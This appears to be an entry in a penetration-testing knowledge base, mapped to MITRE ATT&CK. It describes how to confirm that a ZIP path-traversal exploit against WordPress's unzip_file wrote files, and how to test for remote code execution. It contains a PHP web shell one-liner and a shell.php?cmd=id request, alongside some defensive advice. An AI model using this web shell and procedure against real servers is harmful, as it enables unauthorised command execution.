---
id: p4d5e6f7-g8h9-0123-defg-4567890123
tags:
  - verification
  - file-write
  - rce
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/ls-verify-file]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.896Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Verify Arbitrary File Placement

## Summary

This procedure checks the server filesystem to confirm that the malicious ZIP extraction has written files to the intended arbitrary directory, such as /tmp, and tests for RCE if applicable.

## Description

Post-exploitation, inspect directories for unexpected files from traversal. If the payload is a PHP shell in a web-accessible path, execute commands to validate control. This confirms the full impact of the unzip_file vulnerability in WordPress, including potential for remote code execution in writable web directories.

## Requirements

1. Server shell access (e.g., via SSH) or web-based file manager
2. Knowledge of traversal target path (/tmp in example)
3. Browser for testing PHP payloads

## Defense

Defensive measures and detection strategies:

- Regularly audit filesystem for unauthorized files in /tmp or web root
- Implement file integrity monitoring (e.g., Tripwire)
- Block execution of newly created PHP files via .htaccess

## Objectives

1. Locate and inspect written file
2. Confirm content matches payload
3. Test RCE if file is executable

## Instructions

### Step 1: Check Target Directory

**Context**: Verify file existence in the traversed path.

Execute [[commands/ls-verify-file]] on server:

```bash
ls -la /tmp/poc_file
```

> Output: File details if successfully written.

### Step 2: Inspect File Content

**Context**: Ensure payload is intact.

```bash
cat /tmp/poc_file
```

> Expected: PHP code like system($_GET['cmd']);

### Step 3: Test RCE (If Web-Accessible)

**Context**: Access the file via browser to execute commands.

If placed in /var/www/html/shell.php, visit http://target/shell.php?cmd=id and check for output.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/ls-verify-file]]

## Tools Used


## Tags

- [[file-verification]]
- [[rce-test]]
- [[path-traversal]]
